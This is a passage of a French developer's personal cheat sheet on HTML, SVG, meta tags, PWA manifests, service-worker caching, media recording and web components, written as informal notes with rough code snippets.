         </script>         

svg :
   <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" stroke-linejoin="round">
   <rect x="50" y="20" width="150" height="150" 
           rx="20" ry="20" // pour la rondeur des angles
           style="fill:blue ou rgb(0,0,255);stroke:pink;stroke-width:5;fill-opacity:0.1;stroke-opacity:0.9" />
   <circle cy="138" r="9" cx="100" fill="#aaa"/>
   <line x1="0" y1="0" x2="200" y2="200" style="stroke:rgb(255,0,0);stroke-width:2" />
   <polygon points="200,10 250,190 160,210" style="fill:lime;stroke:purple;stroke-width:1" />
   <polyline points="20,20 40,25 60,40 80,120 120,140 200,180" style="fill:none;stroke:black;stroke-width:3" />
   <path stroke="#DDD"  stroke-width="25"             d="M99,18 15,162H183z"/>
   <path  stroke="#eee" stroke-width="17" fill="#FFF" d="M99,18 15,162H183z"/>
   <path                                  fill="#aaa" d="M91,70a9,9 0 0,1 18,0l-5,50a4,4 0 0,1-8,0z"/>
   M = moveto x y // utiliser un editeur de svg c'est trop complexe
   L = lineto x y
   H = horizontal lineto
   V = vertical lineto
   C = curveto
   S = smooth curveto
   Q = quadratic Bézier curve
   T = smooth quadratic Bézier curveto
   A = elliptical Arc
   Z = closepath
    </svg>
HTML :
email  :<a href="mailto:webmaster@example.com">
pour faire les icones des boutons bouttons c mieux de les faire en vectoriel avec fontawesome (LINKfontaw)
faire un separateur hr personnalise avec label titre
      <div style="width: 100%;height: 13px;border-bottom: 1px solid black;text-align: center;margin-bottom: 4%;">
        <span style="font-size: 40px;background-color: white;">
          Be Ecolo . Be Chic<i class="fa fa-camera-retro fa-lg"></i> // ca ca va mettre une image d'appareil photo (voir sur https://fontawesome.com/icons/exclamation-triangle?style=regular)
        </span>
      </div>
pour faire un champ de type volume regle mesure : 
  Vitesse :<input type="range" min=".5" max="2.5" value="1" step=".1" id="rangeEl"><div style="display:inline" id="rangeElSpeed">1</div><br>
pour bien referencer sa page referencement : 
        <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
      <meta http-equiv="cache-control" content="max-age=0" /> est moins bien que expires ci dessous.
      <meta http-equiv="cache-control" content="no-cache" />   est moins bien que expires ci dessous.
      <meta http-equiv="expires" content="0" />
      <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
      <meta http-equiv="pragma" content="no-cache" />
      <meta name="google-site-verification" content="QR2ftvbXhfKdlLXVS7iM8yOWKpN4uH--pegRciX_yvo" />
      <meta name="keywords" content="vêtement ecologique ethique bio durable environnement prêt-à-porter ecochic feminin t-shirt pull robe jupe wenhua duverge duverge duverger" />
      <meta name="description" content="Prêt-à-porter feminin ethique, ecologique et chic ! Cotton bio, Eco extrafin laine merinos, coton recycle, bouton biodegradable" />
      <title>Prêt-à-porter feminin ethique, ecologique et chic ! Cotton bio, Eco extrafin laine merinos, coton recycle, bouton biodegradable</title>

pour que une image si n'existe pas n'est pas trouvee charge une autre image : (attention si lautre image fallback n'existe pas ca tourne en boucle)
          <img src="http://www.memoclap.com/sons/<?php echo $data['id']?>/logo.png" onerror="this.onerror=null;(pour eviter boucle infinies deerreur si dina existe pas) this.src='../../dina.jpg'"> ou src=""
          document.getElementById("detailagencylogo").onerror=function(){this.src="menubtn.png";}; ou src=""
pour savoir quand le src d'une image est charge : 
						var image = actuel[0].cloneNode(false); //new Image(); //// true: il est recursif dans le dom
            (...)
          image.onload = function () {		
                ....
            }
centrer un texte dans un div : 
          <div style="display: table;overflow: hidden;margin: 0 auto;">
             <div align="center" style="
              border: 1px solid blue;
              height: 50px;
              width: 284px;
              display: table-cell;
              vertical-align: middle;
              align-items: center;">FRY - TRAVEL</div>
          </div>						          
pour centrer une image dans un div : 
  <p align="center"><img...../></p>
ligne de separation horizontale: 
    <hr></hr>
pour mettre un retour chario dans la value d'un bouton : 
  <input type="button" value="blbalba&#13;&#10;bliblibli"></input>
  sinon faire
  document.getElementById("monbouton").value="balbal \n bliblibli";
<sup> = exposent puissance exponent
<sub> = index
Echappement dans URL:
      arobase :%40
      Esperluette	&	&amp;
      Apostrophe	'	&apos;
      Guillemets droits	"	&quot;
      Superieur superieur à	>	&gt;
      Inferieur inferieur à	<	&lt;
pour empecher le cache :
      <meta http-equiv="cache-control" content="max-age=0" /> est moins bien que expires ci dessous.
      <meta http-equiv="cache-control" content="no-cache" /> est moins bien que expires ci dessous.
      <meta http-equiv="expires" content="0" />
      <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
      <meta http-equiv="pragma" content="no-cache" />
      autre methode radicale: renommer ses fichiers et changer ses liens ex: memoclap20131901.js 
  pour interpreter le html 
    le mettre entre les balises <pre></pre>
<s></s> pour faire les caractères barres bares
URLS : URL : 
      encodeur decoder url http pourcent : 
          https://meyerweb.com/eric/tools/dencoder/
          en java voir LINK_URLENCODEDECODE
          
  %20 pour l'espace %E9 pour e, %22 pour les guillemets %27 apostrophe
  %28 pour ( %29 pour ) %3C pour < %3E pour > %2F pour /
PWA : progressive webapps :
        pour que mon appli web puisse devenir appli mobile:
        index.html:
        <head>
            <link rel="icon" type="image/png" sizes="512x512" href="mon-icone.png"/> // attention la taille doit etre la meme que celle definie dans le manifest. voir ci dessous voir LINKmanfsticonpwa
            <link rel="manifest" href="manifest.json">
            <meta name="theme-color" content="#009688">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
          </head>            
        racineprojet/manifest.json // voir https://app-manifest.firebaseapp.com 
            {
            "name":"nom de mon appli",
            "short_name": "petit nom",
            "lang":"fr",
            "start_url":"/", // une seule partie de mon site web seulement peut etre en pwa si je met un chemin plus profond FINIR PAR UN SLASH
            "display":"standalone", // ou fullscreeen, ou minimal-ui A COMPRENDRE je pense que c pour la facon d'afficher sur mobile: on affiche pas les contours du webkit
            "theme_color":"#009888",
            "background_color":"#009588",
            "icons":[ //LINKmanfsticonpwa
              {
                  "src":"mon-icone.png",
                  "sizes":"512x512",
                  "type":"image/png"
              }
              ,
              {
                "src":"icone_splash.png",
                "sizes":"512x512",
                "type":"image/png"
              }
            ]
            }            
       tester mon pwa avec chrome:
            dev>application>service workers>offline
            pluggin chrome "lighthouse"
    service-workers : serviceworkers : POUR SUPPRIMER TOUT CACHE POUR TESTER: 1)unregister dabord puis 2) reloader la page en faisant clic droit -> "vider le cache et faire une reactualisation forcee" 
    pour faire un site qui marche offline avec les service workers : html5 : P envoyer notifications meme quand navigateur est fermé car c'est un worker(thread) indépendant de tous les navigateurs.(un peu comme un programme nodejs) Peut travailler avec indexDB database
    ça ne marche que en https ou en http://localhost
    serviceworker.js:
    if ('serviceWorker' in navigator) { // s'assurer que servicerworker est supporte par le navigateur
            navigator.serviceWorker.register('https://mon_site/service-worker-v1.js',{scope:'./'}).then(function(registration) {      // .register(uneUrlVersUneResource) renvoit une promesse. service-worker.js doit être placé dans un repertoire à la racine pour que toutes les urls soient gérées. Car si je le mets sous https://mon_site/tata/service-worker.js alors seulement la partie sous tata pourra etre offline
                                              ou ./relative/path/service-worker.js 
                      console.log("sauvegarde OK scope="+registration.scope ou registration tout court); // la registration ne se fait que si la version du serviceworker est differente
            })
             .catch(e=>console.log("serviceWorker Sauvegarde KO" + e));
    } else {
        navigateur supporte pas serviceworkers
    }
    -----------dans service-worker.js(a renommer a chaque version: service-worker-v1 puis v2 etc si je le change) :
                                        // voir https://ponyfoo.com/articles/progressive-networking-serviceworker et https://serviceworke.rs/strategy-network-or-cache.html en haut a droite
                                    var cacheVersion='v${version}';
                                    var cacheFiles=[
                                                                            '/testDoNotUse1234/offline.html',
                                                                            '/testDoNotUse1234/*'
                                    
                                                                      ];
                                    var FALLBACK ='/testDoNotUse1234/offline.html';
                                        /*'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="180" stroke-linejoin="round">' +
                                        '  <path stroke="#DDD" stroke-width="25" d="M99,18 15,162H183z"/>' +
                                        '  <path stroke-width="17" fill="#FFF" d="M99,18 15,162H183z" stroke="#eee"/>' +
                                        '  <path d="M91,70a9,9 0 0,1 18,0l-5,50a4,4 0 0,1-8,0z" fill="#aaa"/>' +
                                        '  <circle cy="138" r="9" cx="100" fill="#aaa"/>' + // cx et cy: position centre du cercle x et y. r=rayon
                                        '</svg>';
                                    */
                                    
                                    self.addEventListener('install', function(evt) {
                                      console.log('WORKER: The service worker is being installed.');
                                      evt.waitUntil(precache());
                                    });
                                    function precache() {
                                      return caches.open(cacheVersion).then(function (cache) {
                                        return cache.addAll(cacheFiles);
                                      });
                                    }
                                    
                                    self.addEventListener("activate", function(event) {
                                      console.log('WORKER: The service worker is being activated.');
                                        event.waitUntil(
                                            caches.keys()
                                                .then(function (keys) {
                                                    return Promise.all(
                                                                       keys.filter(function (key) {
                                                                                                return !key.startsWith(cacheVersion);
                                                                                              })
                                                                                              .map((key)=>{
                                                                                                console.log('WORKER: version '+key+' supprimee.');
                                                                                                    return caches.delete(key); // on supprime une vieille version
                                                                                              })
                                                                                          );
                                                                                        })
                                                                                        .then(function() {
                                                                                          console.log('WORKER: activate completed.');
                                                                                        })
                                                                                    );
                                                                                  });
                                    
                                    
                                    self.addEventListener('fetch', function(evt) {
                                      console.log('WORKER: The service worker is serving the asset.');
                                      if (evt.request.method==="GET") // attention si je traite fais un fetch de requete post ça va poster 2 fois!! une fois sans passer par le service-worker et une fois via le service-worker
                                      {
                                      {
                                            let response = proceedFetch(evt.request,evt);
                                              evt.respondWith(response);
                                       }
                                    });
                                    
                                    
                                    function proceedFetch(request,event) {
                                        let requestClone=request.clone();
                                        return getResponseFromNetworkAndCachit(requestClone,400)
                                        .then(function(response){
                                            return response;
                                        })
                                        .catch(function(err){
                                            console.log("WORKER: error! "+err);
                                            let res = fromCacheButFallback(event.request,event);
                                            return res;
                                            });
                                    }
                                    
                                    function getResponseFromNetworkAndCachit(request, timeout)
                                    {
                                     return new Promise(function (fulfill, reject) {
                                        var timeoutId = setTimeout(reject, timeout);
                                        fetch(request)
                                        .then(function(response){
                                                                clearTimeout(timeoutId);
                                                                let responseToCach=response.clone();
                                                                let res = cachIt(request,responseToCach)
                                                                return res;
                                                                },reject)
                                        .then(function(response){
                                                                        fulfill(response);
                                                                        }
                                              );
                                        });
                                    }
                                    function cachIt(request,responseToCache){
                                            caches.open(cacheVersion)
                                            .then(function(cache){
                                                cache.put(request,responseToCache);
                                            })
                                            return responseToCache.clone();
                                    }
                                    function fromCacheButFallback(request,event){
                                            let res= caches.open(cacheVersion)
                                            .then(function(cache){
                                                let res = cache.match(request)
                                                 .then(function (response) {
                                                            if (!response)
                                                            {
                                                                    let res = useFallback(event);
                                                                    return res;
                                                            }
                                                            else
                                                            {
                                                                return response;
                                                            }
                                                    })
                                                  .catch(err=>{ // n'arrive jamais car cache.match n'envoie jamais une exception mais une response undefined si KO
                                                    let res = useFallback(event);
                                                    return res;
                                                    });
                                                    return res;
                                                 }
                                            );
                                            return res;
                                    }
                                    
                                    function useFallback(event) {
                                        if (!event.clientId)
                                         {
                                            let res = returnImageKO();
                                            return res;
                                         }
                                        clients.get(event.clientId)
                                        .then(function(client){
                                            if (!client) {returnImageKO()}
                                            else{
                                                     self.clients.matchAll().then(function (clients){
                                                            clients.forEach(function(client){
                                                              client.postMessage({
                                                                msg: "Hey I just got a fetch from you!",
                                                                url: event.request.url
                                                              });
                                                            });
                                                          });
                                                }
                                    
                                        })
                                    }
                                    function returnImageKO()
                                    {
                                     return caches.open(cacheVersion).then(function (cache) {
                                        return cache.match(FALLBACK)
                                        .then(function (response) {
                                        return response;
                                        })
                                      }).catch(err=>{console.log("WORKER: error! "+err);});
                                    }
                    AFAIRE: channelmessaging api pour faire communiquer un webworker avec mon serviceworker (marche meme si navigateur ferme)                                              
   
    pwa : pour faire un background sync avec mon serviceworker AFAIRE: continuer de documenter
        dans mon fichier app.js:
            navigator.serviceWorker.ready.then(function(swRegistration) { // 
              return swRegistration.sync.register('myFirstSync');
            });
            
        dans mon fichier serviceworker.js:
            self.addEventListener('sync', function(event) {
              if (event.tag == 'myFirstSync') {
                event.waitUntil(doSomeStuff());
              }
            });        
                 
pour faire un enregistrement audio ou video en html5 :
   function onBtnRecordClicked ()
   {
       if (typeof MediaRecorder === 'undefined' || !navigator.getUserMedia) {
          alert('Sorry! This demo requires Firefox 30 and up or Chrome 47 and up.');
        }else {
          navigator.getUserMedia({"audio": false, "video": { "mandatory": { "minWidth": 320, "maxWidth": 320, "minHeight": 240,"maxHeight": 240 }, "optional": [] }}, startRecording, errorCallback);
        }
    }  
    function startRecording(stream) 
    {
             mediaRecorder = new MediaRecorder(stream);
             mediaRecorder.start();
             var url = window.URL || window.webkitURL;
             videoElement.src = url ? url.createObjectURL(stream) : stream;
             videoElement.play();
              
             mediaRecorder.ondataavailable = function(e) {
                 //log('Data available...');
                 //console.log(e.data);
                 //console.log(e);
              
                 chunks.push(e.data);
                 };
             
                 mediaRecorder.onerror = function(e){
                     log('Error: ' + e);
                     console.log('Error: ', e);
                 };
             
             
                 mediaRecorder.onstart = function(){
                     log('Started, state = ' + mediaRecorder.state);
                 };
             
                 mediaRecorder.onstop = function(){
                     log('Stopped, state = ' + mediaRecorder.state);
              
                     var blob = new Blob(chunks, {type: "video/webm"});
                     chunks = [];
              
                     var videoURL = window.URL.createObjectURL(blob);
              
                     downloadLink.href = videoURL;
                     videoElement.src = videoURL;
                     downloadLink.innerHTML = 'Download video file';
              
                     var rand = Math.floor((Math.random() * 10000000));
                     var name = "video_"+rand+".webm" ;
              
                     downloadLink.setAttribute( "download", name);
                     downloadLink.setAttribute( "name", name);
              
                 };
             
                 mediaRecorder.onwarning = function(e){
                     log('Warning: ' + e);
                 };
            }
pour definir la gestion du cache en html5 :
  <html leng="en" manifest="monprojet.manifest">
      le fichier manifest defini les regles de mise en memoire cache.
      Voici ce que contient monprojet.manifest:
          CACHE MANIFEST
          // tous ces fichiers au dessous sont mis en cache.
          #version 54   // c'est un commentaire
          styles.css // c'est tous des chemins relatifs
          main.js
          spashcreen.png
          // tous ces fichiers au dessous ne sont pas mis en cache.
          NETWORK
          blabla.js
          toto.jpg
          FALLBACK
          urlRelativeSurLeReseauDoncLeServeur.png urlRelativeLocaleDeRepliSiReseauNonDispo.png
pour manipuler le css directement:
    attention tester monobjet.style.unstyle==tototo ne marche que si on l'a sette en javascript. Ca ne permet pas de voir dans le css initial comment ça a ete sette.
                      Pour le faire il faut faire:
                        getComputedStyle(monobjet).monstyle==tototo       
    renvoit un tableau de tous les styles
          document.styleSheets
          ensuite y inserer un style :
              document.styleSheets[0].insertRule(".have-border { border: 1px solid black;}", 0);
          ensuite y supprimer un style :
                document.styleSheets[0].deleteRule(index),  // index peut etre recupere par : document.styleSheets[0].cssRules
    pour creer un style 
            var sheet = document.createElement('style');
            sheet.innerHTML = "div {border: 2px solid black; background-color: blue;}";
            document.body.appendChild(sheet);
    pour supprimer un style
          var sheetToBeRemoved = document.getElementById('styleSheetId');
          var sheetParent = sheetToBeRemoved.parentNode;
          sheetParent.removeChild(sheetToBeRemoved);
                
pour faire des frames sans utiliser le iframe :
        <object data="fichier.html" type="text/html" />
pour faire un .ico icone 
      faire un .bmp et le renommer en .ico
      ou bien mettre dans le head : 
          <link rel="icon" type="image/png" href="favicon.png" /> voir LINKfontaw
          <link rel="shortcut icon" type="image/x-icon" href="favicon.png?v=2" /> ?v=2 pour forcer le rafraichissement
les tailles: width, height: 
      pour la largeur il vaut mieux toujours mettre des pourcentages pour que ca passe sur tous les ecrans.
      Pour la hauteur il vaut mieux mettre des pixels fixe uniquement dans les elements les plus profonds de l'arborescence.
      pour aligner des divs horizontallement: faire float:left; margin-left:x% jusqu'au dernier à droite
copyright: 
    &copy; Alt+0169 ©
    Alt+169 ®
      (voir http://appstv.com/faq/2132-comment-faire-des-e-majuscules-avec-accent-sur-iphone-android-ordinateur )
c cedille :
    &ccedil;
    majuscule : &Ccedil;
    e accentaigu majuscule &Eacute;
u accent: 
    &ugrave;
euros :
    &#128; ou Alt+0128(windows-1252 sinon &#8364 Unicode) (1252: francais. 1250: tcheque)
faire un textearea: blur c comme loosefocus 
    <textarea maxlength="50" style="width: 326px; height:80px;" placeholder="Tappez ici la phrase d&#39; texte " id="annotation" onfocus="pause()" onblur="playAndSaveAnnotation()"></textarea> 
faire un drag and drop avec html5:
    <mon element  draggable="true"></mon element>
pour supprimer le cache d'un element audio :
    // pour supprimer cache audio
    	d = new Date();
    	audioeltnew.src=url+"?"+d.getTime();
pour verifier la validite des champs avec html5 : 

                      for (i=0; i<document.querySelector("monFormulaire").elements.length; i++)
                      {   
                          if (!document.querySelector("monFormulaire").elements[i].checkValidity())
                          {
                            err=true;          
                              sendMessage("messagePrompt","Merci de remplir correctement", "50%", "50%");
                          }
champ mot de passe: <input type="password"...
pour s'assurer que l'audio est dispo avant de poursuivre : chargement                             
                    document.getElementById('lecteurAudio').addEventListener('loadedmetadata',function(){
				            document.getElementById('lecteurAudio').currentTime = i;
				            }, false );
				            document.getElementById('lecteurAudio').load();
pour faire des videos html5:
    utiliser freemake video converter mp4 -> ogv et webm
super site de html5:
      http://slides.html5rocks.com/#speech-input
pour mettre un petit hint tooltip dans un input 
      <input placeholder="text" /> (placeholder)
fieldset pour delimiter des zones marche avec legend: legend c'est le titre 
       <fieldset>
          <legend>Personalia:</legend>
          Name: <input type="text" /><br />
          Email: <input type="email" /><br />
          Heure <input type="time" placeholder="Heure de depart"/>
          Date of birth: <input type="date" /> attention!!! utiliser toujours                 var d0 = new Date(document.getElementById("daydeparture").valueAsNumber).toUTCString();
                                                                                              d = new Date(d0); sinon probleme un jour en moins -1 jour
        </fieldset>
faire un select saisissable select editable : (html5) autocompletion
            <input list="browsers" name="nomProjet" id="nomProjet" required/> // oblige obligatoire mandatory
           <datalist id="browsers">
          <option value="Internet Explorer">aaaabbb</option>
          <option value="Firefox">bbb</option>
          <option value="Chrome">cccbbb</option>
          <option value="Opera">dddbbb</option>
          <option value="Safari">eeeebbb</option>
        </datalist> 
mon propre dropdownlist datalist plus efficace encore: prend aussi le milieu 
                                                                <html>
                                                                <head>
                                                                
                                                                <style>
                                                                li{
                                                                display:none;
                                                                }
                                                                .dropdown div
                                                                {
                                                                display:inline;
                                                                }
                                                                ul{
                                                                position: absolute;
                                                                background-color: white;
                                                                }
                                                                </style>
                                                                
                                                                </head>
                                                                <div class="dropdown">
                                                                <input type = "text"><div>V</div>
                                                                <ul>
                                                                <li>totoq</li>
                                                                <li>gdgd</li>
                                                                <li>ababa</li>
                                                                <li>sqqsqsq</li>
                                                                <li>ididid</li>
                                                                </ul>
                                                                </div>
                                                                
                                                                <br>
                                                                <br>
                                                                <div class="dropdown">
                                                                <input type = "text"><div>V</div>
                                                                <ul>
                                                                <li>totoq</li>
                                                                <li>gdgd</li>
                                                                <li>ababa</li>
                                                                <li>sqqsqsq</li>
                                                                <li>ididid</li>
                                                                </ul>
                                                                </div>
                                                                <script>
                                                                init = function()
                                                                {
                                                                for (i=0; i<document.getElementsByClassName("dropdown").length; i++)
                                                                {
                                                                  document.getElementsByClassName("dropdown")[i].querySelector("input").addEventListener("keyup", function (event)
                                                                  {
                                                                    var opt = event.target.nextElementSibling.nextElementSibling.querySelectorAll("li");
                                                                    for (j=0; j<opt.length; j++)
                                                                    {
                                                                      if (opt[j].innerHTML.match(event.target.value))
                                                                      {
                                                                        opt[j].style.display="block";  
                                                                        opt[j].addEventListener("click",function(optsel)
                                                                        {
                                                                          event.target.value=optsel.target.innerHTML;
                                                                          event.target.focus();
                                                                             for (j=0; j<opt.length; j++)
                                                                            {
                                                                              opt[j].style.display="none";           
                                                                            }
                                                                        });                
                                                                      }
                                                                      else
                                                                      {
                                                                      opt[j].style.display="none";
                                                                      }
                                                                    }
                                                                  });
                                                                  document.getElementsByClassName("dropdown")[i].querySelector("div").addEventListener("click", function (event)
                                                                  {
                                                                    var opt = event.target.nextElementSibling.querySelectorAll("li");
                                                                    for (j=0; j<opt.length; j++)
                                                                    {
                                                                      var close=false;
                                                                      if (opt[j].style.display=="block")
                                                                      {
                                                                        close=true;
                                                                      }
                                                                    }
                                                                    for (j=0; j<opt.length; j++)
                                                                    {
                                                                     
                                                                      if (close)
                                                                      {
                                                                        opt[j].style.display="none";     
                                                                      }
                                                                      else
                                                                      {
                                                                      opt[j].style.display="block";
                                                                       opt[j].addEventListener("click",function(optsel)
                                                                        {
                                                                          event.target.previousElementSibling.value=optsel.target.innerHTML;
                                                                          event.target.previousElementSibling.focus();
                                                                             for (j=0; j<opt.length; j++)
                                                                            {
                                                                              opt[j].style.display="none";           
                                                                            }
                                                                        });  
                                                                      }
                                                                    }
                                                                  }); 
                                                                }
                                                                }();
                                                                </script>
                                                                </html>
                                                                <style>
                                                                </style>
faire un drag and drop avec html5 :
    <mon element  draggable="true"></mon element>
super site de html5 :
      http://slides.html5rocks.com/#speech-input
l'element audio html5: 
    <audio id='lecteurAudio' controls="controls" ontimeupdate = "checkloop(this);" onpause="document.getElementById('pauseplaybtn').src='play.png';document.getElementById('pauseplaybtn').classList.add('loopanim');" onplay="document.getElementById('pauseplaybtn').src='pause.png';document.getElementById('pauseplaybtn').classList.remove('loopanim'); unmuteOnStart()" onended="unmuteOnEnd()" style="display:none">
    			        	 Your browser does not support the audio tag.
			      		</audio>
			pour faire un .onplay dynamique ne pas faire .onplay mais 
			     monEltAudio.addEventListener('play',function() {loadSoundAndPlay(url,audioeltnew); });
pour faire un listener sur le timeudpate :
      vid.timeupdate = function() {myFunction()};			     
			     
pour mettre un petit hint tooltip dans un input 
      <input placeholder="text" /> (placeholder)
pour enlever la bordure d'un dessin dans un lien: 
    <img src="" border="0">
quand un lien n'a qu'un onclick pour eviter que la page remonte en haut quand on clique: on a pas de href alors pour que le doigt s'affiche quand le curseur est dessus il faut ajouter ce style au <a>: 
      this.style.cursor="move";
      ou en html
      style="cursor:pointer"
pour qu'un objet a une fleche multidirectionelle quand on place le curseur cursor souris dessus utile pour les drag and drop :  
      this.style.cursor="move";
      ou en html
      style="cursor:move"      
pour rendre un div editable en html: 
    contenteditable      
pour faire un drop de upload de fichier : 
      document.querySelector('#dropzone').ondrop = function(e) 
      {
        var reader = new FileReader();
        reader.onload = function(evt) 
        {  
             try
              {
               document.getElementById('lecteurAudio').src=evt.target.result;
               document.getElementById('lecteurAudio').load(); // des fois besoin de initialiser charger l'audio (sur webkit de android par exemple) pour prise ne compte
              }
              catch (err) 
              {
                console.log("erreur");
            	}
        };
        if (e.dataTransfer.files[0].name.match(".*mp3") || e.dataTransfer.files[0].name.match(".*wav"))
        {
              try
              {
                  reader.readAsDataURL(e.dataTransfer.files[0]);
                  nomfichier=e.dataTransfer.files[0].name;
              }
              catch (err) 
              {
                console.log(err);
            	}
         }
         else
         {
            ... alert
         }
        e.preventDefault();
        return false;
      }
      
      document.querySelector('#dropzone').addEventListener('dragover', function(e) {
        e.preventDefault();
        return false;
      }, false);

passer une fenetre au premier plan : 
  	w=open(lien,'popupn','width=610,height=350,toolbar=no,scrollbars=yes,resizable=yes');	
		w.focus();
mettre une image a un bouton image bouton
          <style>
          .save {
          background:url(save.gif);
          border:none;
          cursor: pointer;
          }
          </style>
          <input type="button" onclick="setStop();" value="Rech..." class="save"/><input type="button" onclick="save();" class="save"/>
pour faire des dessins animes avec background facon sprites: 
    changer background-position et width (on peut centrer le tout avec margin-left)
        changer dynamiqument background-position: 
              var table=[1,8,15,23,31,39,46,54,62,69,77,84,92,100];
          	document.getElementById("avatar").style.background="url(sons/"+idprojetEnCours+"/avatars/"+who+".gif) no-repeat";
          	document.getElementById("avatar").style.backgroundPosition=table[Math.round(Math.random()*13)]+"% 10%";
si dans une table on veut masquer les borders à l'interieur: 
      <table rules="none"

webcomponents : web-components : web components : custom elements : customelements : customelement :
https://developers.google.com/web/fundamentals/web-components/customelements#attrchanges
 au final dans mon html j'aurais :
 <script src="laurent-moncomponent1.js"/>  
  <laurent-moncompoentn1 blabla="toto"></laurent-moncompoentn1> // toujours mettre la balise fermante
  dans laurent-moncompoentn1.js j'ai: import<-customcomponent(shadowdom(template))
      template :
      const templatexxx=document.createElement("template");
      templatexxx.innerHTML=`
      <style>:host // :host c'est pour dire que ce style s'applique que dans le shadowroot parent de ce template (ne marche que dans un shadowdom)
                :host(:hover) // mouse souris par dessus. Exemple: :host(:hover)>::slotted(memoclap-menu-sub){display:block;}// dans le shadowroot >DANS le slot l'element de type memoclap-menu-sub seulement. Attention le style des slots vient aussi depuis l'exterieur du webcomponent. mais::slotted prend l'avantage (si c'est !important seulement je crois)LINKkdkflkjsdf 
                :host slot //sur le <slot>
                :host(.uneclasse) //pour attribuer une classe à mon custom element (hé oui ce n'est pas host.uneclasse)
              {
                background-color: green;display: block; // du style interne à mon template
               }
                ::slotted(a) // LINKkdkflkjsdf pour styler les a par exemple qui sont dans mon webcomponent (les slots) ne peut que selectionner les noeuds top niveau et n'est pas prioritaire sur un css general. Styler un slot directement en html ne fonctionne pas on dirait
                {
                    color: white;
                }

      </style> 
          du dom (balises html...) <slot name="toto"></slot>// A FINIR. represente ce qu'ont met dans ce webcomponent dans le html (attention le style de mon shadowdom ci dessus ne s'applique pas dans les slots sauf avec ::slotted)
          du dom (balises html..ne pas mettre d'appel a des methodes dedans. Marche pas (onclick..marche que si on utilise le javascript direct dedans sans faire appel à des methodes. Si besoin appeler methodes alors faire LINKlkjsdflh)
          `; // ` ` marche partout pour faire des strings qui vont a la ligne ! 
METHODE CLASS: THEBEST? classes es6
                                                class MonElement extends HTMLElement ou un autre element webcomponent (avec de l'animation par exemple)
                                                 {
                                                 // attention les alerts ne marchent dans un webcomponent faire console.log (si j'en ai besoin chercher sur internet)
                                          2)            constructor() // execute en premier à la creation MAIS n'est pas encore dans le DOM. // declarer mes proprietes ici pas au dessus
                                                        { 
                                                          super(); // a faire toujours en premier
                                                          var varmaclasse=this;
                                                          this.id="tata"; // defini direct l'id du dom element|_ATTENTION ne marche que si on instancie la classe en javascript. Pas si on met la balise html dans la page
                                                          this.toto=true;// c'est une propriete properties    |
                                            //         creer un shadowdom : Maintenant FFOx supporte aussi. Avant: (pas encore supporte sur firefox  : besoin faire about:config puis dom.webcomponents.enabled et dom.webcomponents.shadowdom.enabled a true)
                                                         var root = thisMonElement.attachShadow({mode:'open ou closed LINKkddkdkdkd'}); // host maintenant devient un shadowroot: tout ce qu'il a a l'interieur devient invisible. open/closed= atteignable ou pas par javascript et querySelector('div').shadowRoot est visible ou pas selon. LINKkddkdkdkd: si j'ai mis closed alors xxx.shadowRoot=null pour l'avoir faire une variable dans le custom element: this.shadow = this.attachShadow({mode:'closed'});  et je réutilise this.shadow partout.
                                                          on peut juste faire aussi 
                                                          thisMonElement.attachShadow({mode:'open'}); // ca va créer automatiquement this.shadowRoot dans mas classe. Pas besoin de var root                                                        
                                                         var monTemplate = templatexxx; ou `du contenu
                                                                                              <span>SSSS<slot name(facultatif)='aaa'>bBBBB</slot><slot name='bbb'/>CCCC</span>   //se remplira avec le HTML de base qui est comme ça:<h1 slot='aaa'>bla</h1><div slot='bbb'></div>
                                                                                             html${this.variable}html` // pour que ${this.variable} marche il faut mettre tout ce bloc non pas dans constructor mais dans connectedcallback en ayant préalablement défini MaCLasse.variabl=xx
                                                                                        ou autre facon de definir un template: <template id="x">lkjsdf</template>
                                                         var cloneDuTemplate = monTemplate.content.cloneNode(true);  // true: il est recursif dans le dom
                                                        this.shadowRoot.appendChild(cloneDuTemplate); ou root.appendChild(cloneDuTemplate); ou root.appendChild(document.importNode(cloneDuTemplate,true)); ou root.innerHtml=... ou ou this.shadowRoot.innerHTML=""; ou this.shadowRoot.querySelector.....
                                                        sans shadowdom: faire this.cloneDuTemplate=monTemplate.content.cloneNode(true); puis voir LINKsansshadowlkjsdgh
                                                          dansuneboucleparex P faire: 
                                                                     cloneDuTemplate.querySelector(...).innerText=untruc;
                                                                       mondiv ou thisSiJeSuisDansUneClasseHtmlElement.appendChild(cloneDuTemplate); // ajoute le template dans la page (devient visible) MARCHE PAS
                                                        findansuneboucleparex
                                                        div.setAttribute('unAttributduTagHtml','valeurDeLattribut'); PIEGE! utiliserça et ne pas utiliser unElementHTML.unattribut=xxx (ca ne modifie que la classe pas le html et du coup attributeChangedCallback n'est pas appele)
                                                        
                                                        on peut ajouter un listnener au slot si celui ci change en javascript: LINK-(r_r_r)
                                                            monslot.addEventListener('slotchange', e => {
                                                                ...e.currentTarget..
                                                                this.innerHTML;  // est alors accessible. C'est la propriete: contenu de la balise. Par contre this.outerText; et this.innerText; n'ont pas marche?
                                                                du coup faire: si jai <slot name="contenu">-> querySelector("slot[name=contenu]") si je suis hors du slot
                                                                et si je suis dans le slot:
                                                                this.querySelector("[slot=contenu]").style.height=this.taillecontenu; // je change le contenu dynamique dans mon customelement
                                                                this.querySelector("[slot=contenu]").outerHTML; // permet de recuperer le node vers lequel pointe pointeur mon slot
                                                            });
                                                        }
                                              4)       connectedCallback()//execute chaque fois que l'element est insere dans le DOM ATTENTION! Execute une fois AVANT le constructor!!! disconnectedCallback() existe aussi
                                                        { 
                                                                                LINKsansshadowlkjsdgh (ici j'utilise pas de shadowdom dans mon webcomponent)
                                                                                 if (this.cloneDuTemplate!=undefined){
                                                                                    this.appendChild(this.cloneDuTemplate);
                                                                                  }
                                                          this.addEventListener('mousedown' ou 'click',function(evt){varmaclasse.maMethodeOnClick);} // ailleurs dans la classe: maMethodeOnClick(e){...} LINKlkjsdflh voir LINKautredatabiding
                                                          et si c'est un string faire : // convertir un string en fonction function
                                                            this.maMethodeOnClick=new Function ("uneMethode(argument);");

                                                        }
                                                        adoptedCallback(oldDoc,newDoc) // execute chaque fois que this est deplace ailleurs// attention executé une fois avant que le slot ne s'ajoute 
                                                        {
                                                        }
